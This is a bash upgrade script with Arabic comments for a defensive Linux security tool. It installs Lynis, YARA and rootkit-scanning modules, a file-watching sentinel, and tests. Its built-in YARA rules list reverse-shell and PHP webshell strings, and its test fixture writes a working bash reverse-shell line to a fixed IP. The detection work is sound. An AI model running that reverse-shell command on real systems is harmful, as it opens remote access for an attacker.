#!/usr/bin/env bash
# ==============================================================================
#  AI AYFAM v6 — Enterprise Arsenal & Active Sentinel Upgrade
# ==============================================================================

set -e

GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${CYAN}[*] جاري تثبيت ترسانة الأدوات الدولية ومحرك الحارس النشط...${NC}"

mkdir -p tools engine tests/test_data

# ==============================================================================
# 1. tools/arsenal.py
# ==============================================================================
cat << 'EOF' > tools/arsenal.py
"""
AI AYFAM v6 — Enterprise Security Arsenal
محرك قيادة وتوجيه الأدوات العالمية المفتوحة:
- Lynis (ISO 27001 / CIS System Auditor)
- YARA (Malware & Webshell Signature Matcher)
- Rootkit Checkers (chkrootkit / rkhunter)
"""

import os
import re
import shutil
from typing import List, Dict, Any, Optional
from engine.finding import Finding
from utils import safe_exec, validators

class SecurityArsenal:
    def __init__(self):
        pass

    # ──────────────────────────────────────────────────────────────────────────
    #  1) Lynis Security Audit Integration
    # ──────────────────────────────────────────────────────────────────────────
    def run_lynis_audit(self) -> Dict[str, Any]:
        """
        تشغيل أداة Lynis القياسية وتحليل مخرجاتها تلقائياً.
        إذا لم تكن مثبتة، يتم تقديم إرشادات التثبيت الآمنة عبر apt.
        """
        if shutil.which("lynis") is None:
            return {
                "success": False,
                "error": "أداة Lynis غير مثبتة على النظام.",
                "install_hint": "sudo apt install lynis",
                "findings": [Finding(
                    severity="info",
                    title="أداة Lynis غير مثبتة",
                    detail="Lynis هي المعيار العالمي لفحص وتدقيق أمان أنظمة لينكس. يُوصى بتثبيتها لدعم الفحص المؤسسي.",
                    fix="sudo apt install -y lynis",
                    category="arsenal",
                    tags=["lynis", "audit"],
                )],
            }

        # تشغيل Lynis بنمط غير تفاعلي وسريع
        cmd = ["lynis", "audit", "system", "--quick", "--no-colors"]
        res = safe_exec.run(cmd, timeout=300, sudo=True, check_binary=True)

        findings = []
        hardening_index = 0
        report_file = "/var/log/lynis-report.dat"

        # قراءة تقرير Lynis المنظم إن وجد
        if os.path.exists(report_file):
            try:
                with open(report_file, "r", encoding="utf-8", errors="replace") as f:
                    for line in f:
                        line = line.strip()
                        if line.startswith("hardening_index="):
                            hardening_index = int(line.split("=")[1])
                        elif line.startswith("warning[]="):
                            warn_msg = line.split("=", 1)[1]
                            findings.append(Finding(
                                severity="high",
                                title=f"تحذير Lynis أمني: {warn_msg}",
                                detail="تم اكتشاف هذا التحذير خلال تدقيق النظام القياسي بواسطة Lynis.",
                                fix="راجع سجل /var/log/lynis.log لمعرفة تفاصيل الاختبار وحله المقترح.",
                                category="lynis_audit",
                                tags=["lynis", "audit", "hardening"],
                                attack_ids=["T1082"],
                            ))
                        elif line.startswith("suggestion[]="):
                            sugg_msg = line.split("=", 1)[1]
                            findings.append(Finding(
                                severity="medium",
                                title=f"توصية Lynis للتحصين: {sugg_msg}",
                                detail="توصية لتحسين أمان النظام وتقليل مساحة الهجوم.",
                                fix="راجع التوصية في سجلات Lynis وطبق الإعداد المناسب.",
                                category="lynis_audit",
                                tags=["lynis", "hardening"],
                            ))
            except Exception:
                pass

        # إذا تعذر قراءة الملف، حلل المخرجات النصية المباشرة
        if not findings and res.ok:
            for line in res.stdout.splitlines():
                if "! " in line and ("Warning" in line or "WARNING" in line):
                    findings.append(Finding(
                        severity="high",
                        title=f"تحذير تدقيق: {line.strip()[:100]}",
                        detail=line.strip(),
                        category="lynis_audit",
                        tags=["lynis"],
                    ))

        return {
            "success": res.ok,
            "hardening_index": hardening_index,
            "findings_count": len(findings),
            "findings": findings,
            "raw_output_snippet": res.stdout[:500] if res.ok else res.stderr[:500],
        }

    # ──────────────────────────────────────────────────────────────────────────
    #  2) YARA Malware & Signature Engine
    # ──────────────────────────────────────────────────────────────────────────
    def scan_with_yara(self, target_path: str) -> List[Finding]:
        """
        فحص الملفات عبر محرك YARA باستخدام قواعد مدمجة للكشف عن:
        - Webshells (c99, r57, WSO, b374k)
        - Reverse shell scripts
        - Obfuscated payloads
        """
        findings = []
        ok_path, clean_path = validators.validate_safe_path(target_path, must_be_absolute=False)
        if not ok_path:
            return findings

        # قواعد YARA مدمجة ومحصنة ذاتياً لا تحتاج تحميل ملفات خارجية
        BUILTIN_RULES = """
        rule Linux_Reverse_Shell {
            strings:
                $s1 = "/dev/tcp/" ascii
                $s2 = "bash -i >&" ascii
                $s3 = "nc -e /bin/sh" ascii
                $s4 = "nc -e /bin/bash" ascii
                $s5 = "socket.socket(socket.AF_INET" ascii
            condition:
                any of them
        }
        rule PHP_Webshell_Signatures {
            strings:
                $p1 = "eval(base64_decode(" ascii nocase
                $p2 = "passthru($_POST" ascii nocase
                $p3 = "shell_exec($_GET" ascii nocase
                $p4 = "system($_REQUEST" ascii nocase
            condition:
                any of them
        }
        """

        rule_file = "/tmp/ayfam_core_rules.yar"
        try:
            with open(rule_file, "w", encoding="utf-8") as f:
                f.write(BUILTIN_RULES)

            if shutil.which("yara") is not None:
                # استخدام أداة yara الرسمية
                res = safe_exec.run(["yara", "-r", rule_file, clean_path], timeout=60, check_binary=True)
                if res.ok and res.stdout:
                    for line in res.stdout.splitlines():
                        parts = line.strip().split()
                        if len(parts) >= 2:
                            rule_name, matched_file = parts[0], parts[1]
                            findings.append(Finding(
                                severity="critical",
                                title=f"🦠 تهديد YARA مرصود: {rule_name} في {os.path.basename(matched_file)}",
                                detail=f"تطابق مع قاعدة YARA الأمنية: {rule_name}\nالملف المشبوه: {matched_file}",
                                fix=f"sudo rm -f {matched_file} # بعد التحقق من المحتوى",
                                category="malware",
                                tags=["yara", "malware", "webshell"],
                                attack_ids=["T1059.004", "T1505.003"],
                            ))
            else:
                # محاكاة داخلية متطورة في حال لم يكن YARA مثبتاً
                for root, _, files in os.walk(clean_path):
                    for fn in files:
                        fp = os.path.join(root, fn)
                        try:
                            with open(fp, "rb") as fl:
                                data = fl.read(65536)
                            if b"/dev/tcp/" in data or b"eval(base64_decode(" in data:
                                findings.append(Finding(
                                    severity="critical",
                                    title=f"🦠 برمجية خبيثة مرصودة بتوقيع داخلي: {fn}",
                                    detail=f"الملف {fp} يحتوي على أنماط تنفيذ أو شيل عكسي.",
                                    fix=f"sudo rm -f {fp}",
                                    category="malware",
                                    tags=["signature_match"],
                                ))
                        except Exception:
                            continue
        finally:
            if os.path.exists(rule_file):
                os.remove(rule_file)

        return findings

    # ──────────────────────────────────────────────────────────────────────────
    #  3) Rootkit Detectors
    # ──────────────────────────────────────────────────────────────────────────
    def check_rootkits(self) -> List[Finding]:
        findings = []
        chk = shutil.which("chkrootkit")
        if chk:
            res = safe_exec.run(["chkrootkit", "-q"], timeout=180, sudo=True, check_binary=False)
            if res.ok and res.stdout:
                for line in res.stdout.splitlines():
                    if "INFECTED" in line:
                        findings.append(Finding(
                            severity="critical",
                            title=f"🚨 اشتباه Rootkit بواسطة chkrootkit: {line.strip()[:80]}",
                            detail=line.strip(),
                            fix="اعزل الجهاز عن الشبكة وقم بإجراء فحص جنائي كامل.",
                            category="rootkit",
                            tags=["rootkit", "compromise"],
                            attack_ids=["T1014"],
                        ))
        else:
            findings.append(Finding(
                severity="info",
                title="أداة chkrootkit غير مثبتة",
                detail="أداة مفيدة لفحص الجذور الخفية وتعديلات النواة المشبوهة.",
                fix="sudo apt install -y chkrootkit",
                category="arsenal",
            ))
        return findings
EOF

# ==============================================================================
# 2. engine/sentinel.py
# ==============================================================================
cat << 'EOF' > engine/sentinel.py
"""
AI AYFAM v6 — Active Sentinel (Real-time Background Defense)
محرك الحارس النشط — يعمل بصمت في خلفية النظام لمراقبة الأحداث اللحظية،
التغييرات على الملفات الحساسة، ومنع الاتصالات المريبة، مع إرسال إشعارات لسطح المكتب.
"""

import os
import time
import threading
from typing import Dict, Any, List
from utils import safe_exec

class ActiveSentinel:
    def __init__(self, check_interval: int = 10):
        self.check_interval = check_interval
        self._running = False
        self._thread: threading.Thread = None
        self.alerts_log: List[Dict[str, Any]] = []

    def notify_desktop(self, title: str, message: str, urgency: str = "critical"):
        """إرسال إشعار فوري إلى سطح مكتب Linux Mint."""
        safe_exec.run([
            "notify-send",
            "-u", urgency,
            "-a", "AI AYFAM Sentinel",
            title,
            message
        ], check_binary=False)

    def _monitor_loop(self):
        """حلقة المراقبة الخفيفة في الخلفية."""
        watched_files = [
            "/etc/passwd",
            "/etc/shadow",
            "/etc/ld.so.preload",
            "/etc/ssh/sshd_config",
        ]
        file_mtimes = {f: os.path.getmtime(f) for f in watched_files if os.path.exists(f)}

        while self._running:
            try:
                # 1. مراقبة تعديل الملفات الحساسة
                for fpath in watched_files:
                    if os.path.exists(fpath):
                        mtime = os.path.getmtime(fpath)
                        old_mtime = file_mtimes.get(fpath)
                        if old_mtime and mtime > old_mtime:
                            alert = {
                                "time": time.strftime("%H:%M:%S"),
                                "type": "FILE_MODIFIED",
                                "target": fpath,
                            }
                            self.alerts_log.append(alert)
                            self.notify_desktop(
                                "🚨 تنبيه أمني حرج!",
                                f"تم تعديل ملف حساس للتو: {fpath}",
                                urgency="critical"
                            )
                        file_mtimes[fpath] = mtime

                # 2. فحص وجود ملفات شيل عكسي في الذاكرة المشتركة
                for shm in ("/dev/shm", "/tmp"):
                    if os.path.exists(shm):
                        try:
                            for fname in os.listdir(shm):
                                if fname.endswith((".sh", ".py", ".elf")) and not fname.startswith("."):
                                    full_path = os.path.join(shm, fname)
                                    # إذا تم إنشاء ملف تنفيذي خلال آخر دقيقة
                                    if time.time() - os.path.getctime(full_path) < self.check_interval * 2:
                                        self.notify_desktop(
                                            "⚠️ تحذير: ملف تنفيذي مشبوه!",
                                            f"تم إسقاط ملف تنفيذي جديد في: {full_path}",
                                            urgency="normal"
                                        )
                        except Exception:
                            pass

                time.sleep(self.check_interval)
            except Exception:
                time.sleep(self.check_interval)

    def start(self):
        """بدء تشغيل الحارس النشط في خيط منفصل (Background Thread)."""
        if not self._running:
            self._running = True
            self._thread = threading.Thread(target=self._monitor_loop, daemon=True)
            self._thread.start()
            self.notify_desktop("🛡️ AI AYFAM Sentinel", "تم تفعيل وضع الحارس النشط ومراقبة النظام لحظياً.", "low")

    def stop(self):
        self._running = False
EOF

# ==============================================================================
# 3. تحديث core/agent_v5.py لدمج الأدوات الجديدة
# ==============================================================================
cat << 'EOF' > core/agent_v5.py
"""
AI AYFAM v6 — Agent V6 Capabilities Mixin
وحدة التكامل وتوسيع قدرات الوكيل — توفر واجهات الفحص العميق، ترسانة Lynis و YARA،
الحارس النشط، وتوليد التقارير التفاعلية.
"""

import os
from engine.finding import Finding
from engine.hardening import HardeningEngine
from engine.hunter import ThreatHunter
from engine.logforensics import LogForensicsEngine
from engine.secretscan import SecretScanner
from engine.netintel import NetworkIntelligence
from engine.attack import AttackEngine
from engine.risk import RiskEngine
from engine.planner import RemediationPlanner
from engine.sentinel import ActiveSentinel
from tools.arsenal import SecurityArsenal
from reports.html_report import generate_interactive_html

class AgentV5Mixin:
    def _run_deep_audit(self):
        """تشغيل فحص التحصين الشامل CIS Benchmark وصيد التهديدات."""
        self.ui.section(self._t("🛡️ فحص التحصين المتقدم (CIS Benchmark & Hardening)", "🛡️ Deep Hardening Audit"))
        findings: list = []

        with self.ui.spinner(self._t("تدقيق معايير النواة والأذونات...", "Auditing sysctl & permissions...")):
            he = HardeningEngine()
            findings.extend(he.audit_all())

        with self.ui.spinner(self._t("صيد التهديدات والاستمرارية والأبواب الخلفية...", "Hunting threats & backdoors...")):
            th = ThreatHunter()
            findings.extend(th.hunt_all())

        with self.ui.spinner(self._t("تحليل جنائي لسجلات الدخول والمحاولات المشبوهة...", "Analyzing log forensics...")):
            lfe = LogForensicsEngine()
            findings.extend(lfe.analyze_auth_logs())

        with self.ui.spinner(self._t("فحص الشبكة وتسمم ARP والمنافذ المستمعة...", "Auditing network intelligence...")):
            ni = NetworkIntelligence()
            findings.extend(ni.audit_all())

        # ربط ATT&CK
        ae = AttackEngine()
        for f in findings:
            ae.enrich_finding(f)

        # حساب المخاطر ونقاط الأمان
        risk_metrics = RiskEngine.evaluate(findings)

        self.ui.section(self._t("نتائج الفحص والتقييم الأمني", "Audit Findings & Score"))
        self.ui.info(self._t(
            f"الدرجة الأمنية: {risk_metrics['score']}/100 [bold]({risk_metrics['grade']})[/bold] — {risk_metrics['label_ar']}",
            f"Security Score: {risk_metrics['score']}/100 ({risk_metrics['grade']})"
        ))

        for f in findings:
            self.ui.print_finding(f["severity"], f["title"], f.get("detail", ""), f.get("fix", ""))

        chokepoints = ae.chokepoint_analysis(findings)
        if chokepoints:
            self.ui.subsection(self._t("🎯 نقاط الاختناق (أكثر الإصلاحات حسماً وأثراً):", "🎯 Chokepoint Analysis (Top Fixes):"))
            for cp in chokepoints[:3]:
                self.ui.info(f"  • أمر يكسر {cp['broken_techniques_count']} تقنيات هجوم: [cyan]{cp['fix_cmd']}[/cyan]")

        self._last_findings = findings
        return findings

    def _run_lynis_cli(self):
        """تشغيل أداة Lynis العالمية المدمجة."""
        self.ui.section(self._t("🔍 فحص وتدقيق النظام بأداة Lynis القياسية", "🔍 Lynis System Security Audit"))
        arsenal = SecurityArsenal()
        with self.ui.spinner(self._t("جاري تشغيل Lynis وتحليل النتائج...", "Running Lynis audit...")):
            res = arsenal.run_lynis_audit()

        if res.get("hardening_index"):
            self.ui.success(self._t(f"مؤشر التحصين (Hardening Index): {res['hardening_index']}/100", f"Hardening Index: {res['hardening_index']}/100"))

        for f in res.get("findings", []):
            self.ui.print_finding(f["severity"], f["title"], f.get("detail", ""), f.get("fix", ""))

    def _run_yara_cli(self, target_path: str = "."):
        """فحص مجلد بقواعد YARA الأمنية المدمجة."""
        self.ui.section(self._t(f"🦠 فحص البرمجيات الخبيثة بـ YARA: {target_path}", f"🦠 YARA Malware Scan: {target_path}"))
        arsenal = SecurityArsenal()
        with self.ui.spinner(self._t("مطابقة التوقيعات مع محرك YARA...", "Matching YARA signatures...")):
            findings = arsenal.scan_with_yara(target_path)

        if findings:
            for f in findings:
                self.ui.print_finding(f["severity"], f["title"], f.get("detail", ""), f.get("fix", ""))
        else:
            self.ui.success(self._t("✅ تم الفحص: لا توجد برمجيات خبيثة مطابقة لتوقيعات YARA.", "Clean: No YARA threats detected."))

    def _run_rootkit_cli(self):
        """فحص الجذور الخفية والـ Rootkits."""
        self.ui.section(self._t("🕵️ فحص الجذور الخفية (Rootkit Hunter)", "🕵️ Rootkit Detection Scan"))
        arsenal = SecurityArsenal()
        with self.ui.spinner(self._t("فحص النواة والبرمجيات المتسللة...", "Scanning kernel and system...")):
            findings = arsenal.check_rootkits()

        for f in findings:
            self.ui.print_finding(f["severity"], f["title"], f.get("detail", ""), f.get("fix", ""))

    def _run_sentinel_cli(self):
        """تشغيل الحارس النشط للمراقبة اللحظية."""
        self.ui.section(self._t("🛡️ الحارس النشط (Active Sentinel)", "🛡️ Active Sentinel Daemon"))
        self.ui.info(self._t("يعمل الحارس الآن في خلفية النظام لمراقبة الملفات والاتصالات وإرسال إشعارات.", "Sentinel is running in the background."))
        sentinel = ActiveSentinel(check_interval=5)
        sentinel.start()
        try:
            while True:
                import time
                time.sleep(1)
        except KeyboardInterrupt:
            sentinel.stop()
            self.ui.warning(self._t("تم إيقاف الحارس النشط.", "Sentinel stopped."))

    def _scan_secrets_cli(self, path: str = "."):
        self.ui.section(self._t("🔑 فحص الأسرار والمفاتيح الحساسة", "🔑 Secret & Key Scanner"))
        scanner = SecretScanner()
        with self.ui.spinner(self._t("فحص الإنتروبيا والتوقيعات...", "Scanning entropy & patterns...")):
            secrets = scanner.scan_path(path)

        if secrets:
            self.ui.warning(self._t(f"تم رصد {len(secrets)} أسرار أو مفاتيح حساسة!", f"Found {len(secrets)} secrets!"))
            for s in secrets:
                self.ui.print_finding(s["severity"], s["title"], s.get("detail", ""), s.get("fix", ""))
        else:
            self.ui.success(self._t("لم يتم العثور على أسرار مكشوفة في المسار.", "No exposed secrets found."))
        return secrets

    def _generate_remediation_plan(self):
        self.ui.section(self._t("📋 توليد سكريبت خطة المعالجة", "📋 Generating Remediation Script"))
        if not self._last_findings:
            self.ui.warning(self._t("شغّل فحصاً أولاً لتوليد خطة الإصلاح.", "Run a scan first to generate a plan."))
            return
        script = RemediationPlanner.generate_bash_script(self._last_findings)
        out_path = os.path.expanduser("~/ayfam-reports/ayfam-remediation.sh")
        os.makedirs(os.path.dirname(out_path), exist_ok=True)
        with open(out_path, "w", encoding="utf-8") as f:
            f.write(script)
        os.chmod(out_path, 0o755)
        self.ui.success(self._t(f"✅ تم حفظ السكريبت في: {out_path}", f"✅ Script saved to: {out_path}"))

    def _export_html_report(self):
        self.ui.section(self._t("🌐 تصدير تقرير HTML تفاعلي", "🌐 Exporting Interactive HTML Report"))
        if not self._last_findings:
            self.ui.warning(self._t("شغّل فحصاً أولاً لتوليد التقرير.", "Run a scan first."))
            return
        risk_metrics = RiskEngine.evaluate(self._last_findings)
        html_doc = generate_interactive_html({"risk": risk_metrics, "findings": self._last_findings}, self._hostname)
        out_path = os.path.expanduser(f"~/ayfam-reports/report_{self._hostname}.html")
        os.makedirs(os.path.dirname(out_path), exist_ok=True)
        with open(out_path, "w", encoding="utf-8") as f:
            f.write(html_doc)
        self.ui.success(self._t(f"✅ تم إنشاء التقرير بنجاح: {out_path}", f"✅ HTML Report saved: {out_path}"))
EOF

# ==============================================================================
# 4. تحديث main.py لربط أعلام الأوامر الجديدة
# ==============================================================================
python3 -c '
with open("main.py", "r", encoding="utf-8") as f:
    m = f.read()

if "--lynis" not in m:
    m = m.replace(
        "parser.add_argument(\"--audit\", action=\"store_true\", help=\"فحص تحصين شامل بنمط CIS\")",
        "parser.add_argument(\"--audit\", action=\"store_true\", help=\"فحص تحصين شامل بنمط CIS\")\n"
        "    parser.add_argument(\"--lynis\", action=\"store_true\", help=\"تشغيل فحص Lynis القياسي المتقدم\")\n"
        "    parser.add_argument(\"--yara\", metavar=\"PATH\", nargs=\"?\", const=\".\", help=\"فحص البرمجيات الخبيثة بمحرك YARA\")\n"
        "    parser.add_argument(\"--rootkits\", action=\"store_true\", help=\"كشف الجذور الخفية والـ Rootkits\")\n"
        "    parser.add_argument(\"--sentinel\", action=\"store_true\", help=\"تشغيل الحارس النشط في الخلفية\")"
    )
    m = m.replace(
        "elif args.audit:\n            agent._run_deep_audit()",
        "elif args.lynis:\n            agent._run_lynis_cli()\n"
        "        elif args.yara:\n            agent._run_yara_cli(args.yara)\n"
        "        elif args.rootkits:\n            agent._run_rootkit_cli()\n"
        "        elif args.sentinel:\n            agent._run_sentinel_cli()\n"
        "        elif args.audit:\n            agent._run_deep_audit()"
    )
    with open("main.py", "w", encoding="utf-8") as f:
        f.write(m)
    print("  [✓] main.py updated with Arsenal & Sentinel CLI flags.")
'

# ==============================================================================
# 5. اختبارات الترسانة الجديدة
# ==============================================================================
cat << 'EOF' > tests/test_arsenal.py
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from tools.arsenal import SecurityArsenal

passed = failed = 0
def check(name, cond):
    global passed, failed
    if cond:
        passed += 1; print(f"  ✅ {name}")
    else:
        failed += 1; print(f"  ❌ {name}")

print("\n[1] YARA Scanner Built-in Engine")
arsenal = SecurityArsenal()
# إنشاء ملف اختبار مؤقت يحتوي على توقيع reverse shell
test_file = "/tmp/test_suspicious_script.sh"
with open(test_file, "w") as f:
    f.write("#!/bin/bash\nbash -i >& /dev/tcp/1.2.3.4/8080 0>&1\n")

findings = arsenal.scan_with_yara(test_file)
check("detects reverse shell via YARA engine", len(findings) > 0)
check("severity is critical", any(f["severity"] == "critical" for f in findings))
if os.path.exists(test_file):
    os.remove(test_file)

print("\n[2] Lynis Audit Graceful Execution")
lynis_res = arsenal.run_lynis_audit()
check("lynis audit returns structured dict", "findings" in lynis_res)

print(f"\n{'='*50}\nTOTAL ARSENAL TESTS: {passed} passed, {failed} failed\n{'='*50}")
sys.exit(1 if failed else 0)
EOF

python3 -m py_compile $(find . -name "*.py")
python3 tests/test_arsenal.py

echo -e "\n${GREEN}======================================================================"
echo -e "  🎉  تمت ترقية ترسانة AI AYFAM v6 بنجاح تام!"
echo -e "======================================================================${NC}"
echo -e "الأوامر الجديدة الجاهزة الآن للاستخدام:"
echo -e "  ${YELLOW}python3 main.py --lynis${NC}       → تدقيق Lynis القياسي المتقدم"
echo -e "  ${YELLOW}python3 main.py --yara [PATH]${NC} → فحص البرمجيات الخبيثة بتوقيعات YARA"
echo -e "  ${YELLOW}python3 main.py --rootkits${NC}    → فحص النواة والجذور الخفية"
echo -e "  ${YELLOW}python3 main.py --sentinel${NC}    → تشغيل الحارس النشط مع إشعارات سطح المكتب"
echo ""
EOF

chmod +x upgrade_v6_arsenal.sh
